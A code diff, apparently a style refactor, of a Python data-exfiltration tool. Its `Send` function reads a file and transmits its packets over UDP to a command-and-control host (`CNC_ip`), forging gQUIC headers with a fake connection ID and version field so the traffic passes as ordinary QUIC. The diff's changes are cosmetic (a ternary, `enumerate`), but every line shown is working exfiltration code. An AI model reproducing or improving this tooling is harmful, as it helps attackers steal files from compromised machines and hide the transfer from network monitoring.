@@ -20,10 +20,7 @@ def _send_one(data, pckt_counter, dest_ip, dest_port=GQUIC_PORT, ccc=None):
 	"""
 	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 	actual_data = "\x0d"  # Flags - None
-	if ccc:
-		actual_data += ccc  # CID
-	else:
-		actual_data += "\x43\x53\x50\x45\x54\x48\x53\x59"
+	actual_data += ccc if ccc else "\x43\x53\x50\x45\x54\x48\x53\x59"
 	actual_data += "\x51\x30\x34\x33"  # Version Q304
 	actual_data += struct.pack('B', pckt_counter)  # Packet number increment
 	actual_data += data  # Payload
@@ -48,10 +45,8 @@ def Send(file_name, CNC_ip, CNC_port=GQUIC_PORT, key=DEFAULT_KEY):
 	)
 	crc = hex(zlib.crc32(open(file_name, 'rb').read()))
 	_send_one(data = this_prepObj['Packets'][0], pckt_counter = 0, dest_ip = CNC_ip, dest_port = CNC_port, ccc = crc)
-	i = 1
-	for pkt in this_prepObj['Packets'][1:]:
+	for i, pkt in enumerate(this_prepObj['Packets'][1:], start=1):
 		_send_one(data=pkt, pckt_counter=i, dest_ip=CNC_ip, dest_port=CNC_port)
-		i += 1
 	return True
 
 
